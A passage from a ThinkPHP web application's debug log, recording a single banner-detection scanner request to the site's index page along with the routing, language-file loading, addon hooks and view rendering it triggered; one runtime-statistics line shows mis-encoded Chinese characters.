  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000223s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T21:05:27+08:00 ] 139.162.106.181 GET 114.115.146.220/
[è¿è¡Œæ—¶é—´ï¼š0.024395s] [åžåçŽ‡ï¼š40.99req/s] [å†…å­˜æ¶ˆè€—ï¼š471.93kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000062s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001063s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'HTTP Banner Detection (https://security.ipip.net)',
  'connection' => 'close',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000851s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000324s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
